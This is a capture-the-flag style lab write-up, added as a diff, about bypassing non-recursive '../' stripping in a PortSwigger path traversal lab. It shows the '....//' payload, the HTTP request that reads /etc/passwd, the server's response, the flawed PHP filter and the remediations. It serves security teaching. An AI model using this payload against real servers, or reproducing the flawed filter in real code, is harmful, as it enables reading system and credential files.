@@ -1,0 +1,228 @@
+# File Path Traversal with Non-Recursive Traversal Sequence Stripping
+
+## Lab Information
+
+| Field | Value |
+|-------|-------|
+| Lab | File path traversal with non-recursive traversal sequence stripping |
+| Category | Path Traversal / Directory Traversal |
+| Severity | High |
+| CWE | CWE-22 – Improper Limitation of a Pathname to a Restricted Directory |
+| OWASP Top 10 | A01:2021 – Broken Access Control |
+
+---
+
+# Executive Summary
+
+The application was vulnerable to a **Path Traversal** vulnerability despite attempting to sanitize user input. Instead of properly validating file paths, the application simply removed occurrences of the traversal sequence `../`.
+
+This sanitization was performed only once (non-recursively), allowing an attacker to craft a payload that reconstructs valid traversal sequences after the filtering process.
+
+By exploiting this weakness, it was possible to bypass the protection and access arbitrary files on the server, including `/etc/passwd`.
+
+---
+
+# Objective
+
+Read the contents of:
+
+```text
+/etc/passwd
+```
+
+---
+
+# Vulnerability Discovery
+
+While browsing the application, product images were loaded through the following endpoint:
+
+```http
+GET /image?filename=56.jpg HTTP/2
+Host: LAB-ID.web-security-academy.net
+```
+
+The `filename` parameter appeared to be directly used to retrieve files from the filesystem.
+
+Initial attempts using the classic payload:
+
+```text
+../../../etc/passwd
+```
+
+were unsuccessful, indicating that the application performed some form of input sanitization.
+
+---
+
+# Exploitation
+
+A traversal bypass payload was used:
+
+```text
+....//....//....//etc/passwd
+```
+
+The request became:
+
+```http
+GET /image?filename=....//....//....//etc/passwd HTTP/2
+Host: LAB-ID.web-security-academy.net
+```
+
+---
+
+# Result
+
+The server returned the contents of the Linux password file.
+
+Example response:
+
+```text
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin:/usr/sbin/nologin
+...
+```
+
+The successful disclosure confirmed that arbitrary file read was possible.
+
+---
+
+# Technical Analysis
+
+The application likely attempted to prevent directory traversal using logic similar to:
+
+```php
+$filename = str_replace("../", "", $_GET['filename']);
+```
+
+This approach is flawed because the replacement is performed only once.
+
+The supplied payload:
+
+```text
+....//....//....//etc/passwd
+```
+
+contains overlapping traversal sequences.
+
+During sanitization, the application removes one occurrence of `../`, but the remaining characters combine to form a new valid traversal sequence.
+
+Conceptually:
+
+```
+Input:
+....//
+
+After removing one "../":
+../
+```
+
+Repeating this process across the payload results in an effective path equivalent to:
+
+```text
+../../../etc/passwd
+```
+
+which the operating system resolves to:
+
+```text
+/etc/passwd
+```
+
+---
+
+# Root Cause
+
+The application attempts to sanitize user input by removing traversal sequences instead of validating the final canonical path.
+
+The filtering mechanism is non-recursive, allowing malicious traversal sequences to be reconstructed after sanitization.
+
+---
+
+# Impact
+
+An attacker can:
+
+- Read arbitrary files from the server.
+- Access configuration files.
+- Obtain application source code.
+- Leak credentials and secrets.
+- Gather information for privilege escalation.
+- Facilitate further attacks such as Remote Code Execution when chained with other vulnerabilities.
+
+---
+
+# Proof of Concept
+
+## Original Request
+
+```http
+GET /image?filename=56.jpg HTTP/2
+Host: LAB-ID.web-security-academy.net
+```
+
+## Malicious Request
+
+```http
+GET /image?filename=....//....//....//etc/passwd HTTP/2
+Host: LAB-ID.web-security-academy.net
+```
+
+---
+
+# Root Cause Illustration
+
+**Application logic**
+
+```php
+$filename = str_replace("../", "", $_GET['filename']);
+```
+
+**Attacker input**
+
+```text
+....//....//....//etc/passwd
+```
+
+**Effective path after incomplete filtering**
+
+```text
+../../../etc/passwd
+```
+
+**Resolved filesystem path**
+
+```text
+/etc/passwd
+```
+
+---
+
+# Remediation
+
+Recommended mitigations include:
+
+- Never rely on string replacement to sanitize paths.
+- Resolve the canonical path using functions such as `realpath()`.
+- Verify that the resolved path remains inside the intended directory.
+- Use an allowlist of permitted filenames.
+- Reject any path containing traversal components.
+- Avoid exposing filesystem paths through user-controlled input.
+
+---
+
+# References
+
+- PortSwigger Web Security Academy – Path Traversal
+- OWASP Path Traversal
+- CWE-22 – Improper Limitation of a Pathname to a Restricted Directory
+
+---
+
+# Key Takeaways
+
+This lab demonstrates why blacklist-based filtering is unreliable.
+
+Removing dangerous substrings without validating the final canonical path leaves applications vulnerable to traversal bypass techniques.
+
+The proper defense is not to sanitize traversal sequences but to ensure that the resolved path always remains within an authorized directory.
